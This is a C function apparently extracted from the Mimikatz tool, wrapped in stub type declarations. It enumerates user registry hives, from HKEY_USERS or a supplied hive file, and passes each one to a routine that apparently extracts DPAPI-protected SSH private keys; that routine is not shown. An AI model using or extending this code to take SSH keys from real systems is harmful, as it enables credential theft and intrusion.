
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int wchar_t ;
typedef int PKULL_M_REGISTRY_HANDLE ;
typedef int NTSTATUS ;
typedef int LPCWSTR ;
typedef int * HKEY ;
typedef scalar_t__ HANDLE ;
typedef int DWORD ;


 int CloseHandle (scalar_t__) ;
 scalar_t__ CreateFile (int ,int ,int ,int *,int ,int ,int *) ;
 int FALSE ;
 int FILE_SHARE_READ ;
 int GENERIC_READ ;
 int * HKEY_USERS ;
 scalar_t__ INVALID_HANDLE_VALUE ;
 int KEY_ENUMERATE_SUB_KEYS ;
 int KEY_READ ;
 int KULL_M_REGISTRY_TYPE_HIVE ;
 int KULL_M_REGISTRY_TYPE_OWN ;
 int LPTR ;
 scalar_t__ LocalAlloc (int ,int) ;
 int LocalFree (int *) ;
 int OPEN_EXISTING ;
 int PRINT_ERROR_AUTO (char*) ;
 int STATUS_SUCCESS ;
 int kprintf (char*,...) ;
 int kuhl_m_dpapi_ssh_keys4user (int ,int *,int *,int,int **) ;
 int kull_m_registry_RegCloseKey (int ,int *) ;
 scalar_t__ kull_m_registry_RegEnumKeyEx (int ,int *,int ,int *,int *,int *,int *,int *,int *) ;
 scalar_t__ kull_m_registry_RegOpenKeyEx (int ,int *,int *,int ,int ,int **) ;
 scalar_t__ kull_m_registry_RegQueryInfoKey (int ,int *,int *,int *,int *,int *,int *,int *,int *,int *,int *,int *,int *) ;
 int kull_m_registry_close (int ) ;
 scalar_t__ kull_m_registry_open (int ,scalar_t__,int ,int *) ;
 scalar_t__ kull_m_string_args_byName (int,int **,char*,int *,int *) ;
 int wcsstr (int *,char*) ;

NTSTATUS kuhl_m_dpapi_ssh(int argc, wchar_t * argv[])
{
 PKULL_M_REGISTRY_HANDLE hRegistry;
 LPCWSTR szHive;
 HANDLE hHive;
 HKEY hBase, hUser;
 DWORD i, nbSubKeys, szMaxSubKeyLen, szKey;
 wchar_t * keyName;

 if(kull_m_string_args_byName(argc, argv, L"hive", &szHive, ((void*)0)))
 {
  hHive = CreateFile(szHive, GENERIC_READ, FILE_SHARE_READ, ((void*)0), OPEN_EXISTING, 0, ((void*)0));
  if(hHive != INVALID_HANDLE_VALUE)
  {
   if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hHive, FALSE, &hRegistry))
   {
    kuhl_m_dpapi_ssh_keys4user(hRegistry, ((void*)0), ((void*)0), argc, argv);
    kull_m_registry_close(hRegistry);
   }
   CloseHandle(hHive);
  }
  else PRINT_ERROR_AUTO(L"CreateFile");
 }
 else
 {
  if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, ((void*)0), FALSE, &hRegistry))
  {
   if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_USERS, ((void*)0), 0, KEY_ENUMERATE_SUB_KEYS, &hBase))
   {
    if(kull_m_registry_RegQueryInfoKey(hRegistry, hBase, ((void*)0), ((void*)0), ((void*)0), &nbSubKeys, &szMaxSubKeyLen, ((void*)0), ((void*)0), ((void*)0), ((void*)0), ((void*)0), ((void*)0)))
    {
     szMaxSubKeyLen++;
     if(keyName = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
     {
      for(i = 0; i < nbSubKeys; i++)
      {
       szKey = szMaxSubKeyLen;
       if(kull_m_registry_RegEnumKeyEx(hRegistry, hBase, i, keyName, &szKey, ((void*)0), ((void*)0), ((void*)0), ((void*)0)))
       {
        if(!wcsstr(keyName, L"_Classes"))
        {
         kprintf(L"%s ", keyName);
         if(kull_m_registry_RegOpenKeyEx(hRegistry, hBase, keyName, 0, KEY_READ, &hUser))
         {
          kprintf(L"\n");
          kuhl_m_dpapi_ssh_keys4user(hRegistry, hUser, keyName, argc, argv);
          kull_m_registry_RegCloseKey(hRegistry, hUser);
         }
         else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx");
        }
       }
      }
      LocalFree(keyName);
     }
    }
    kull_m_registry_RegCloseKey(hRegistry, hBase);
   }
   else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx");
   kull_m_registry_close(hRegistry);
  }
 }
 return STATUS_SUCCESS;
}
